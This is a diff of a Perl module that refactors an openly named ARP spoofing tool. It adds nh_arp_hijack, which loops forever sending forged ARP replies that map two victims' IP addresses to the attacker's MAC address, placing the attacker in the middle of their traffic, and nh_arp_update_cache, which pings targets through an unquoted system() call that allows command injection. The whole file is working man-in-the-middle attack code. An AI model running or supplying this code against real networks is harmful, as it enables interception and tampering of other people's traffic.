@@ -1,11 +1,11 @@
 package net::arp::nh_arp;
 use Net::ARP;
-use net::ip::nh_ip;
+use net::ipv4::nh_ip;
 require Exporter;
 
 @ISA = qw(Exporter);
 @EXPORT = qw(
-                nh_arp_spoof 
+                nh_arp_spoof nh_arp_update_cache nh_arp_hijack 
              );
 
 my $nh_arp_request = "request";           
@@ -20,12 +20,12 @@ sub nh_arp_send_reply {
     my $dip1 = shift(@_);
     my $dip2 = shift(@_);
 
-    Net::ARP::send_packet($if,                 # Device
-        $dip1,          # Source IP
-        $dip2,          # Destination IP
-        $smac,                 # Source MAC
-        $dmac2,  # Destinaton MAC
-        $nh_arp_reply);             # ARP operation
+    Net::ARP::send_packet($if,          # Device
+        $dip1,                          # Source IP
+        $dip2,                          # Destination IP
+        $smac,                          # Source MAC
+        $dmac2,                         # Destinaton MAC
+        $nh_arp_reply);                 # ARP operation
 
     Net::ARP::send_packet($if,
         $dip2,
@@ -35,33 +35,22 @@ sub nh_arp_send_reply {
         $nh_arp_reply); 
 }            
 
-sub nh_arp_spoof {
+sub nh_arp_update_cache {
+    my $dip = shift(@_);
+
+    system("ping -c 1 $dip >/dev/null");
+}
+
+sub nh_arp_hijack {
     my $it = shift(@_);
     my $if = shift(@_);
     my $dip1 = shift(@_);
     my $dip2 = shift(@_);
-    my @dips;
     my $smac;
     my $dmac1;
     my $dmac2;
-
+ 
     $smac = Net::ARP::get_mac($if);
-    $local_ip = &nh_ip_get($if); 
-    system("ping -c 1 $dip1 >/dev/null");
-    system("ping -c 1 $dip2 >/dev/null");
-#    Net::ARP::send_packet($if,
-#        $local_ip,
-#        $dip1,
-#        $smac, 
-#        $nh_arp_request_broadcast,
-#        $nh_arp_request); 
-#    Net::ARP::send_packet($if,
-#        $local_ip,
-#        $dip2,
-#        $smac, 
-#        $nh_arp_request_broadcast,
-#        $nh_arp_request); 
-#    sleep(1);
     while (1) {
         $dmac1 = Net::ARP::arp_lookup($if, $dip1);
         if ($dmac1 eq "unknown") {
@@ -75,6 +64,17 @@ sub nh_arp_spoof {
         print("$dip1\[$smac\] -> $dip2\[$dmac2\] and $dip2\[$smac\] -> $dip2\[$dmac1\]\n");
         sleep($it);
     }
+}
+
+sub nh_arp_spoof {
+    my $it = shift(@_);
+    my $if = shift(@_);
+    my $dip1 = shift(@_);
+    my $dip2 = shift(@_);
+
+    &nh_arp_update_cache($dip1);
+    &nh_arp_update_cache($dip2);
+    &nh_arp_hijack($it, $if, $dip1, $dip2);
 }
 
 1;
